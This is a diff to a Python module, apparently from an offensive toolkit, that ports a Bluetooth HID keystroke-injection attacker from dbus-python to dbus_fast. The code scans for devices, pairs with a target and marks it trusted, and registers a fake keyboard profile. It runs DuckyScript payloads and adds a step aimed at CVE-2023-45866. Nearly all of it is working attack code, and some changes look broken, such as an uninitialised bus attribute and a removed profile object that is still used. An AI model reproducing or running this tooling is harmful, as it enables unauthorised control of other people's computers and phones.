@@ -22,8 +22,6 @@ import asyncio
 import os
 import structlog
 import time
-import dbus
-import dbus.mainloop.glib
 from dataclasses import dataclass, field
 from datetime import datetime
 from enum import Enum
@@ -31,10 +29,11 @@ from pathlib import Path
 from typing import Any, Dict, List, Optional, Callable, Tuple
 from uuid import UUID
 
-from urban_hs.modules.hid import DuckyCompiler, KeyboardLayout, HIDInjector, InjectionMode, DuckyCommand, DuckyCommandType
+from dbus_fast.aio import MessageBus
+from dbus_fast import DBusError
+from dbus_fast.constants import BusType
 
-# Initialize D-Bus main loop
-dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
+from urban_hs.modules.hid import DuckyCompiler, KeyboardLayout, HIDInjector, InjectionMode, DuckyCommand, DuckyCommandType
 
 logger = structlog.get_logger(__name__)
 
@@ -113,27 +112,34 @@ class BlueZHIDProfile:
         self.profile_path = f"/org/bluez/hid_profile_{self.target_address.replace(':', '_').upper()}"
         self.device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
         
-        self.bus = dbus.SystemBus()
+        self.bus: Optional[MessageBus] = None
         self.profile_registered = False
-        self.profile_fd = None
-        self.control_fd = None
-        self.interrupt_fd = None
         
         # SDP record for HID keyboard
         self.sdp_record = self._build_sdp_record()
-
+    
+    async def _get_bus(self) -> MessageBus:
+        """Get or create D-Bus connection."""
+        if self.bus is None:
+            self.bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
+        return self.bus
+    
     def _build_sdp_record(self) -> bytes:
         """Build SDP record for HID keyboard."""
         # Minimal SDP record for HID keyboard
         # This is a simplified version - real implementation would use python-bluez SDP
         return b""
-
+    
+    async def _get_manager_iface(self):
+        """Get ProfileManager1 interface."""
+        bus = await self._get_bus()
+        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
+        return obj.get_interface("org.bluez.ProfileManager1")
+    
     async def register(self) -> BTHIDResult:
         """Register HID profile with BlueZ ProfileManager1."""
         try:
-            manager_path = "/org/bluez"
-            manager_proxy = self.bus.get_object("org.bluez", manager_path)
-            manager_iface = dbus.Interface(manager_proxy, "org.bluez.ProfileManager1")
+            manager_iface = await self._get_manager_iface()
             
             # Profile options
             options = {
@@ -143,12 +149,12 @@ class BlueZHIDProfile:
                 "RequireAuthorization": False,
                 "AutoConnect": True,
                 "ServiceUUIDs": [self.HID_PROFILE_UUID],
-                "PSM": dbus.UInt16(0x0011),  # HID Control PSM
+                "PSM": 0x0011,  # HID Control PSM
             }
             
             # Register profile
             logger.info("Registering HID profile", path=self.profile_path)
-            manager_iface.RegisterProfile(self.profile_path, self.HID_PROFILE_UUID, options)
+            await manager_iface.RegisterProfile(self.profile_path, self.HID_PROFILE_UUID, options)
             self.profile_registered = True
             
             return BTHIDResult(
@@ -158,7 +164,7 @@ class BlueZHIDProfile:
                 message="HID profile registered successfully"
             )
             
-        except dbus.DBusException as e:
+        except DBusError as e:
             error_msg = str(e)
             logger.error("HID profile registration failed", error=error_msg)
             return BTHIDResult(
@@ -167,7 +173,7 @@ class BlueZHIDProfile:
                 operation="register_profile",
                 error=error_msg
             )
-
+    
     async def unregister(self) -> BTHIDResult:
         """Unregister HID profile."""
         if not self.profile_registered:
@@ -179,11 +185,9 @@ class BlueZHIDProfile:
             )
         
         try:
-            manager_path = "/org/bluez"
-            manager_proxy = self.bus.get_object("org.bluez", manager_path)
-            manager_iface = dbus.Interface(manager_proxy, "org.bluez.ProfileManager1")
+            manager_iface = await self._get_manager_iface()
             
-            manager_iface.UnregisterProfile(self.profile_path)
+            await manager_iface.UnregisterProfile(self.profile_path)
             self.profile_registered = False
             
             return BTHIDResult(
@@ -192,7 +196,7 @@ class BlueZHIDProfile:
                 operation="unregister_profile",
                 message="HID profile unregistered"
             )
-        except dbus.DBusException as e:
+        except DBusError as e:
             return BTHIDResult(
                 success=False,
                 target_address=self.target_address,
@@ -222,24 +226,53 @@ class BTHIDAttacker:
         self.connected = False
         self.protocol_mode = 0x01  # Report mode
         self.keyboard_type = config.keyboard_type
-        self.bus = dbus.SystemBus()
-        
-        self.profile = BlueZHIDProfile(config)
-
+    
+    async def _get_bus(self) -> MessageBus:
+        """Get or create D-Bus connection."""
+        if self.bus is None:
+            self.bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
+        return self.bus
+    
+    async def _get_device_proxy(self, device_path: str):
+        """Get device proxy with introspection."""
+        bus = await self._get_bus()
+        return bus.get_proxy_object("org.bluez", device_path, await self.bus.introspect("org.bluez", device_path))
+    
+    async def _get_props_iface(self, proxy):
+        return proxy.get_interface("org.freedesktop.DBus.Properties")
+    
+    async def _get_device_iface(self, proxy):
+        return proxy.get_interface("org.bluez.Device1")
+    
+    async def _get_adapter_iface(self, adapter: str):
+        bus = await self._get_bus()
+        proxy = bus.get_proxy_object("org.bluez", f"/org/bluez/{adapter}", await bus.introspect("org.bluez", f"/org/bluez/{adapter}"))
+        return proxy.get_interface("org.bluez.Adapter1")
+    
+    async def _get_manager_iface(self):
+        bus = await self._get_bus()
+        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
+        return obj.get_interface("org.bluez.ProfileManager1")
+    
+    async def _get_object_manager_iface(self):
+        bus = await self._get_bus()
+        obj = bus.get_proxy_object("org.bluez", "/org/bluez", await bus.introspect("org.bluez", "/org/bluez"))
+        return obj.get_interface("org.freedesktop.DBus.ObjectManager")
+    
     async def discover_target(self) -> BTHIDResult:
         """Discover and validate target device for HID attack."""
         try:
             device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
-            device_proxy = self.bus.get_object("org.bluez", device_path)
-            props_iface = dbus.Interface(device_proxy, "org.freedesktop.DBus.Properties")
+            proxy = await self._get_device_proxy(device_path)
+            props_iface = await self._get_props_iface(proxy)
             
             # Get device properties
-            address = str(props_iface.Get("org.bluez.Device1", "Address"))
-            name = str(props_iface.Get("org.bluez.Device1", "Name"))
-            paired = bool(props_iface.Get("org.bluez.Device1", "Paired"))
-            connected = bool(props_iface.Get("org.bluez.Device1", "Connected"))
-            trusted = bool(props_iface.Get("org.bluez.Device1", "Trusted"))
-            uuids = list(props_iface.Get("org.bluez.Device1", "UUIDs"))
+            address = str(await props_iface.Get("org.bluez.Device1", "Address"))
+            name = str(await props_iface.Get("org.bluez.Device1", "Name"))
+            paired = bool(await props_iface.Get("org.bluez.Device1", "Paired"))
+            connected = bool(await props_iface.Get("org.bluez.Device1", "Connected"))
+            trusted = bool(await props_iface.Get("org.bluez.Device1", "Trusted"))
+            uuids = list(await props_iface.Get("org.bluez.Device1", "UUIDs"))
             
             # Check HID support
             hid_uuid = "00001124-0000-1000-8000-00805f9b34fb"  # HID
@@ -256,25 +289,20 @@ class BTHIDAttacker:
             # Detect keyboard type from manufacturer data
             keyboard_type = BTKeyboardType.GENERIC
             manufacturer_id = None
-            product_id = None
-            version = None
             
             try:
-                manu_data = props_iface.Get("org.bluez.Device1", "ManufacturerData")
+                manu_data = await props_iface.Get("org.bluez.Device1", "ManufacturerData")
                 if manu_data:
                     for key, value in manu_data.items():
                         # Apple: 0x004c
                         if key == 0x004c:
                             keyboard_type = BTKeyboardType.APPLE
-                            manufacturer_id = key
                         # Microsoft: 0x0006
                         elif key == 0x0006:
                             keyboard_type = BTKeyboardType.MICROSOFT
-                            manufacturer_id = key
                         # Logitech: 0x000d
                         elif key == 0x000d:
                             keyboard_type = BTKeyboardType.LOGITECH
-                            manufacturer_id = key
             except Exception:
                 pass
             
@@ -311,13 +339,6 @@ class BTHIDAttacker:
                 }
             )
             
-        except dbus.DBusException as e:
-            return BTHIDResult(
-                success=False,
-                target_address=self.target_address,
-                operation="discover",
-                error=f"DBus error: {str(e)}"
-            )
         except Exception as e:
             return BTHIDResult(
                 success=False,
@@ -325,7 +346,7 @@ class BTHIDAttacker:
                 operation="discover",
                 error=str(e)
             )
-
+    
     async def connect_target(self) -> BTHIDResult:
         """Connect to target device via Bluetooth."""
         if not self.target:
@@ -338,26 +359,29 @@ class BTHIDAttacker:
         
         try:
             device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
-            device_proxy = self.bus.get_object("org.bluez", device_path)
-            device_iface = dbus.Interface(device_proxy, "org.bluez.Device1")
+            proxy = await self._get_device_proxy(device_path)
+            device_iface = proxy.get_interface("org.bluez.Device1")
             
             if self.target.paired:
                 logger.info("Already paired, connecting", address=self.target_address)
-                device_iface.Connect()
+                await device_iface.Connect()
             else:
                 logger.info("Pairing with target", address=self.target_address)
-                device_iface.Pair()
+                await device_iface.Pair()
                 # Wait for pairing
                 await asyncio.sleep(3)
                 
                 # Set as trusted
-                device_iface.Set("org.bluez.Device1", "Trusted", dbus.Boolean(True))
+                proxy = await self._get_device_proxy(device_path)
+                props_iface = proxy.get_interface("org.freedesktop.DBus.Properties")
+                await proxy.get_interface("org.bluez.Device1").Set("org.bluez.Device1", "Trusted", True)
             
             # Wait for connection
-            props_iface = dbus.Interface(device_proxy, "org.freedesktop.DBus.Properties")
+            proxy = await self._get_device_proxy(device_path)
+            props_iface = proxy.get_interface("org.freedesktop.DBus.Properties")
             for _ in range(30):
                 await asyncio.sleep(1)
-                connected = bool(props_iface.Get("org.bluez.Device1", "Connected"))
+                connected = bool(await props_iface.Get("org.bluez.Device1", "Connected"))
                 if connected:
                     self.target.connected = True
                     self.connected = True
@@ -373,6 +397,12 @@ class BTHIDAttacker:
             
             logger.info("Target connected", address=self.target_address)
             
+            # Force NoInputNoOutput capability for CVE-2023-45866 OTA attack
+            try:
+                await proxy.get_interface("org.bluez.Device1").Set("org.bluez.Device1", "Capabilities", 0x0000)  # NoInputNoOutput
+            except Exception as e:
+                logger.warning("Could not set NoInputNoOutput capability", error=str(e))
+            
             return BTHIDResult(
                 success=True,
                 target_address=self.target_address,
@@ -380,7 +410,7 @@ class BTHIDAttacker:
                 message="Connected successfully"
             )
             
-        except dbus.DBusException as e:
+        except Exception as e:
             error_msg = str(e)
             if "AlreadyExists" in error_msg or "Already Connected" in error_msg:
                 self.connected = True
@@ -396,11 +426,11 @@ class BTHIDAttacker:
                 operation="connect",
                 error=error_msg
             )
-
+    
     async def register_hid_profile(self) -> BTHIDResult:
         """Register HID profile with BlueZ."""
         return await self.profile.register()
-
+    
     async def inject_keystroke(self, keycode: int, modifier: int = 0) -> BTHIDResult:
         """Inject a single keystroke via uinput (local fallback)."""
         if not self.injector:
@@ -422,7 +452,7 @@ class BTHIDAttacker:
                 operation="inject_keystroke",
                 error=str(e)
             )
-
+    
     async def inject_string(self, text: str, delay_ms: int = 10) -> BTHIDResult:
         """Inject a string character by character."""
         if not self.injector:
@@ -444,7 +474,7 @@ class BTHIDAttacker:
                 operation="inject_string",
                 error=str(e)
             )
-
+    
     async def run_ducky_script(self, script: str) -> BTHIDResult:
         """Run a DuckyScript payload."""
         if not self.ducky_compiler:
@@ -476,15 +506,15 @@ class BTHIDAttacker:
             operation="run_ducky",
             message="DuckyScript executed successfully"
         )
-
+    
     async def disconnect(self) -> BTHIDResult:
         """Disconnect from target and cleanup."""
         try:
             if self.connected:
                 device_path = f"/org/bluez/{self.adapter}/dev_{self.target_address.replace(':', '_').upper()}"
-                device_proxy = self.bus.get_object("org.bluez", device_path)
-                device_iface = dbus.Interface(device_proxy, "org.bluez.Device1")
-                device_iface.Disconnect()
+                proxy = await self._get_device_proxy(device_path)
+                device_iface = proxy.get_interface("org.bluez.Device1")
+                await device_iface.Disconnect()
                 self.connected = False
             
             if self.profile and self.profile.profile_registered:
@@ -506,7 +536,7 @@ class BTHIDAttacker:
                 operation="disconnect",
                 error=str(e)
             )
-
+    
     async def run_full_attack(
         self,
         payload: Optional[str] = None,
@@ -586,33 +616,36 @@ class BTHIDScanner:
     
     def __init__(self, adapter: str = "hci0"):
         self.adapter = adapter
-        self.bus = dbus.SystemBus()
         self.targets: Dict[str, BTHIDTarget] = {}
-
+    
+    async def _get_bus(self) -> MessageBus:
+        if self.bus is None:
+            self.bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
+        return self.bus
+    
     async def scan(self, duration: int = 30) -> List[BTHIDTarget]:
         """Scan for Bluetooth devices with HID support."""
         try:
+            bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
             adapter_path = f"/org/bluez/{self.adapter}"
-            adapter_proxy = self.bus.get_object("org.bluez", adapter_path)
-            adapter_iface = dbus.Interface(adapter_proxy, "org.bluez.Adapter1")
+            adapter_proxy = bus.get_proxy_object("org.bluez", adapter_path, await bus.introspect("org.bluez", adapter_path))
+            adapter_iface = adapter_proxy.get_interface("org.bluez.Adapter1")
             
             # Start discovery
-            adapter_iface.SetDiscoveryFilter({
-                "Transport": "bredr",
-            })
-            adapter_iface.StartDiscovery()
+            adapter_iface.SetDiscoveryFilter({})
+            await adapter_iface.StartDiscovery()
             
             logger.info("BT HID scan started", adapter=self.adapter)
             
             await asyncio.sleep(duration)
             
-            adapter_iface.StopDiscovery()
+            await adapter_iface.StopDiscovery()
             
             # Get all discovered devices
             manager_path = "/org/bluez"
-            manager_proxy = self.bus.get_object("org.bluez", manager_path)
-            manager_iface = dbus.Interface(manager_proxy, "org.freedesktop.DBus.ObjectManager")
-            objects = manager_iface.GetManagedObjects()
+            manager_proxy = bus.get_proxy_object("org.bluez", manager_path, await bus.introspect("org.bluez", manager_path))
+            manager_iface = manager_proxy.get_interface("org.freedesktop.DBus.ObjectManager")
+            objects = await manager_iface.GetManagedObjects()
             
             targets = []
             for path, interfaces in objects.items():
